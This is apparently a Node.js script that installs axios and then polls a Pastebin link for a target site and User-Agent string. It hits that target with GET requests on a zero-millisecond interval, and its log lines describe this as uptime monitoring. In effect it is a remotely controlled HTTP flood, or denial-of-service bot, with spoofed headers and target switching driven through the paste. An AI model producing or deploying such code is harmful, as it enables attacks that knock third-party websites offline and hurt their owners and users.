const { exec } = require('child_process');

exec('npm install axios', (error, stdout, stderr) => {
  if (error) {
    console.error(`Error: ${error.message}`);
    return;
  }
  if (stderr) {
    console.error(`Command execution failed: ${stderr}`);
    return;
  }
  console.log(`Package installed successfully.`);
  startScript();
});

function startScript() {
  const axios = require('axios');

  const SITE_URL = 'YOUR_PASTEBIN_LINK';
  const PING_INTERVAL = 0;
  const CHECK_INTERVAL = 5000;

  let siteToPing;
  let pingIntervalId;
  let useragent = '';

  async function getSiteUrl() {
    try {
      const response = await axios.get(SITE_URL);
      const data = response.data;

      if (data.site === 'N/A') {
        console.log('No site available. Stopping pinging.');
        clearInterval(pingIntervalId);
        return;
      }

      const newSiteToPing = data.site;
      useragent = data.useragent;

      if (newSiteToPing !== siteToPing) {
        siteToPing = newSiteToPing;
        console.log(`Starting pinging site: ${siteToPing}`);
        startPinging();
      } else {
        console.log(`Site ${siteToPing} is the same as the last check. Skipping...`);
      }
    } catch (error) {
      console.error('Error occurred while fetching site URL:', error);
    }
  }

  async function pingSite() {
    try {
      await axios.get(siteToPing, {
        headers: {
          'User-Agent': useragent,
        },
      });
      console.log(`Site ${siteToPing} is up!`);
    } catch (error) {
      console.log(`Site ${siteToPing} is down!`);
    }
  }

  function startPinging() {
    pingSite();

    pingIntervalId = setInterval(pingSite, PING_INTERVAL);
  }

  getSiteUrl();

  setInterval(getSiteUrl, CHECK_INTERVAL);
}
